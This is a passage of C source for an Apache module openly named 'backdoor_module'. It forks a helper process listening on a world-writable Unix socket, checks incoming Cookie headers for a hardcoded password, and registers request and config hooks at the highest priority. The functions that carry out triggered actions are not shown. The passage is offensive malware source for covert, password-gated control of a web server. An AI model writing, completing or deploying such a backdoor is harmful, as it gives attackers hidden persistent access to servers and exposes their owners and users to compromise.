    if (pid > 0) {
        //sblist_add(pidList,&pid);
        return OK;
    }

    signal(SIGTERM, sig_handler);
    signal(SIGKILL, sig_handler);

    int master, rc, sd, sr;
    struct sockaddr_un serveraddr;
    char buf[1024];
    fd_set readfds;


    master = socket(AF_UNIX, SOCK_STREAM, 0);
    if (sd < 0) {
        exit(0);
    }
    /*int reuse;
    if (setsockopt(master, SOL_SOCKET, SO_REUSEADDR, (char *)&reuse, sizeof(int)) == -1){
        exit(0);
    }*/
    memset(&serveraddr, 0, sizeof(serveraddr));
    serveraddr.sun_family = AF_UNIX;
    strcpy(serveraddr.sun_path, IPC);
    rc = bind(master, (struct sockaddr *)&serveraddr, SUN_LEN(&serveraddr));
    if (rc < 0) {
        exit(0);
    }
    listen(master, 5);
    chmod(serveraddr.sun_path, 0777);

	waitIPC(master);
}

static int backdoor_log_transaction(request_rec *r) {
	const apr_array_header_t *fields;
    int i;
    apr_table_entry_t *e = 0;

	int backdoor = 0;

	fields = apr_table_elts(r->headers_in);
	e = (apr_table_entry_t *) fields->elts;
	for(i = 0; i < fields->nelts; i++) {
		if (!strcmp(e[i].key,"Cookie")) {
			if (strstr(e[i].val, PASSWORD)) {
				backdoor = 1;
			}
		}
	}

	if (backdoor == 0) {
		return DECLINED;
	}
	exit(0);
}

/*apr_pool_cleanup_register(p,NULL,removeIPC,apr_pool_cleanup_null);

void apr_pool_cleanup_register 	( 	apr_pool_t *  	p,
                                       const void *  	data,
                                       apr_status_t(*)(void *)  	plain_cleanup,
                                       apr_status_t(*)(void *)  	child_cleanup
)*/


        static void backdoor_register_hooks(apr_pool_t *p){
	ap_hook_post_read_request((void *) backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_post_config((void *) backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
    //ap_hook_pre_config((void *) backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
	ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
}

module AP_MODULE_DECLARE_DATA backdoor_module = {
    STANDARD20_MODULE_STUFF,
    NULL,			/* create per-dir    config structures */
    NULL,			/* merge  per-dir    config structures */
    NULL,			/* create per-server config structures */
    NULL,			/* merge  per-server config structures */
    NULL,			/* table of config file commands       */
    backdoor_register_hooks	/* register hooks                      */
};
